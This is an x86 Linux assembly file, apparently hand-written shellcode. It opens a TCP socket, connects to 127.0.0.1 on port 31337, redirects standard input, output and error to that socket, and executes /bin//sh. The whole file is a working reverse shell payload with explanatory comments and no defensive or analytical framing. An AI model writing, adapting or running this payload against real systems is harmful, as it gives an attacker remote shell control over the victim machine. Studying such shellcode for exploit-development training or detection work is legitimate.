section .DATA
section .BSS
section .TEXT

global _start
_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
; int socket(int domain, int type, int protocol)
; socket bl = 1
;  	unsigned long *args
    push eax ; protocol a 0
    push byte 0x1 ; type
    push byte 0x2 ; domain
; socketcall(int call, unsigned long *args)
    mov ecx, esp ; fill unsigned long *args
    inc bl      ; fill first argument or call
    mov al, 102 ; socketcall sys call
    int 0x80

    mov esi, eax ; esi is a general purpose register 
; connect bl = 3
    ; Fill this (struct sockaddr*)&srv_addr
    mov byte[esp], 0x7f ; 127.0.0.
    mov byte[esp+3], 0x1 ;  127.0.0.1
    push word 0x697a ; PORT = 31337 
    push word 2      ; Internet protocol aka TCP

    mov ecx, esp     ; save to ecx

    push byte 0x10 ; sizeof
    push ecx ;
    push esi ; 
; socketcall(int call, unsigned long *args)
    mov ecx, esp ;
    inc bl 
    inc bl       ; I need bl to be 3
    mov al, 102
    int 0x80
    
    xor ecx, ecx
    mov cl, 0
    mov al, 63
    int 0x80

    xor ecx, ecx
    mov cl, 1
    mov al, 63
    int 0x80

    xor ecx, ecx
    mov cl, 2
    mov al, 63
    int 0x80

; execve(const char *filename, """" argv[], """" envp[])

    push edx
    push long 0x68732f2f
    push long 0x6e69622f
    mov ebx, esp
    push edx
    push edx
    mov ecx, esp
    mov al, 0x0b
    int 0x80